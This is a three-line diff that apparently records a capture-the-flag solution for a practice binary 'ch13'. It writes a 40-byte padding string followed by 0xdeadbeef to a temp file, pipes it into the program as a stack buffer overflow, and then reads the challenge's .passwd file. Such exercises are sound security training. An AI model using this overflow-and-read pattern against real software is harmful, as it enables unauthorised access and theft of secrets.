@@ -1,0 +1,3 @@
+python -c "import sys;sys.stdout.write('a'*40 + '\xef\xbe\xad\xde\x0a')" > /tmp/lolz
+cat /tmp/lolz - | ./ch13
+cat .passwd
